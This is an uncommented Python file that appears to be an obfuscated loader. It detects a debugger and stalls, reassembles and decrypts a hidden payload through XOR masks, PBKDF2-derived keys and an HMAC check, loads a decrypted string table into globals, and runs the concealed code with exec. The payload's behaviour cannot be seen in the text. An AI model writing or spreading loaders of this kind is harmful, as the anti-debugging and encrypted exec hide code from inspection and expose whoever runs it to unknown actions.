import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_2651ce_0 = 'We2afSgV9dvQM5BxheHqB0oxAPmp7U55h09/NzDLV2Dh'
_2651ce_1 = '+9g=='
_2651ce_2 = 'Ah7IGhhjDoZp/C6lTl4F07jM3mGPTaQ'
_pls = [_2651ce_0, _2651ce_1, _2651ce_2]
_33b029 = [(63621,18596,2),(27341,14447,2),(50424,20672,2),(11743,26315,2),(54110,31795,2),(10199,5286,2),(2202,24785,2),(23479,909,2),(28556,20670,2),(44593,43145,2),(6308,5874,2),(43098,42482,2),(43702,594,2),(54580,29133,2),(35808,54510,2),(49973,47428,2),(0,0,0),(0,0,0)]
_ee6805 = 'sCFSog=='
_73743f = 'g352Hmd3kO6sl08l'
_f2ecd5 = 'hyK2xKltywc='
_7aad66 = [1, 2, 0]
_salt = base64.b64decode(_f2ecd5)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _7aad66
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_e9ed0d = base64.b64decode(_assembled)
_67c3ce = 32
_03ae63 = _e9ed0d[:-_67c3ce]
_67c3ce = _e9ed0d[-_67c3ce:]
_15366c = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_33b029)
_hdr = base64.b64decode(_ee6805)
_nonce = base64.b64decode(_73743f)
_km_seed = hashlib.sha256(_15366c + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _03ae63, hashlib.sha256).digest()
if _calc_tag != _67c3ce:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_03ae63)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_03ae63, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_0aa12f'] = mmap
globals()['_370a35'] = lambda i: globals()['_0aa12f'][str(i)]
_x = globals()['_370a35']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
